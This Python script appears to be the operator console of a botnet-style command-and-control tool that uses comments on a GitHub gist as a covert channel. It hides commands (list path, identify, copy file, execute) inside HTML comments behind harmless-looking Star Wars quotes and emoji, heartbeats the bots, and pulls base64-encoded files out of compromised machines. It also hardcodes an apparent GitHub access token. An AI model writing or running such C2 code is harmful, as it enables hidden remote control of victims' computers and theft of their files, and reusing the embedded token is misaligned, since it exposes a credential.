import requests as rq
from datetime import datetime, timedelta
import sys
import signal
from threading import Thread, Event
import time
import json
import subprocess

TIMEOUT = 10 #heartbeat interval

URL = "https://api.github.com/gists/d3639f5c1e928cf7b6570929a075eb4c/comments"
ACCESS_TOKEN = "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"

greetings = ["Hello.👋", "Hi. 👋", "What's up 👋", "Ciao 👋"]
headers = {
    "Accept": "application/vnd.github+json",
    "Authorization": "Bearer "+ACCESS_TOKEN
}

def checkBots(id, stop):
    timestamp = datetime.now()
    idx = 0
    while True:
        if stop():
            break

        x = rq.get(URL, headers=headers)
        if x.status_code == 200:
            x = x.json()
            for comment in x:
                body = comment["body"]
                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ')
                if timestamp < dt: #new comment
                    print("dt: " + dt.strftime("%H:%M:%S") + " tmstp: " + timestamp.strftime("%H:%M:%S"))
                    if "👀" in body:
                        print(body.split()[4])
        else:
            print(x.json())
        print("Heartbeating bots...")
        timestamp = datetime.utcnow()
        data = {
            "body": greetings[idx]
        }
        r = rq.patch(URL+"/4422313", headers=headers, data=json.dumps(data))
        print(r)
        idx = idx + 1
        if idx > 3:
            idx = 0
        time.sleep(TIMEOUT)

stop_threads = False

t1 = Thread(target=checkBots, args=(id, lambda: stop_threads))
t1.start()

threads = []

def copyHandler(id, stop, filename):
    timestamp = datetime.utcnow()
    while True:
        if stop():
            break
        x = rq.get(URL, headers=headers)
        if x.status_code == 200:
            x = x.json()
            for comment in x:
                body = comment["body"]
                #from GMT0 to GMT+1
                dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ')
                if timestamp < dt: #new comment
                    if filename in body and "As you wish" in body:
                        #id = comment["id"]
                        start = body.find("<!--")+5+len(filename)+1
                        end = body.find("-->")-1
                        encoded = body[start:end]
                        name = "foo.txt"
                        if filename.rfind("/") != -1:
                            name = filename[(filename.rfind("/")+1):]
                        else:
                            name = filename
                        f = open(name, "w")
                        f.write(encoded)
                        f.close()
                        res = subprocess.run(["base64", "--decode", name], stdout=subprocess.PIPE).stdout.decode("utf-8")
                        f = open(name, "w")
                        f.write(res)
                        f.close()
                        print(filename + " copied successfully")
                        return
        timestamp = datetime.utcnow()
        time.sleep(int(TIMEOUT/2))
    


def post(body):
    r = rq.post(URL, headers=headers, data=json.dumps(body))
    print(r)

while True:
    s = input()
    #print("You wrote: " + s)
    if s == "exit":
        print("Exiting...")
        stop_threads = True
        break
    elif s == "w":
        post({"body": "Where are the droids? 🥳"})
    elif s == "ls":
        print("Input path: ")
        path = input()
        post({"body": "Where are the droids? 🤓 <!-- " + path + " -->"})
    elif s == "id":
        post({"body": "Mesa called Jar Jar Binks, mesa your humble servant! 🫵"})
    elif s == "copy":
        print("write filename: ")
        filename = input()
        post({"body": "Release him! 🤯 <!-- " + filename + " -->"})
        t = Thread(target=copyHandler, args=(id, lambda: stop_threads, filename))
        threads.append(t)
        t.start()
    elif s == "exec":
        print("write path: ")
        path = input()
        post({"body": "Let the past die 😵‍💫 <!-- " + path + " -->"})
    else:
        print("Invalid command. (w, ls, id, copy, exec, exit)")

stop_threads = True
t1.join() 
for t in threads:
    t.join()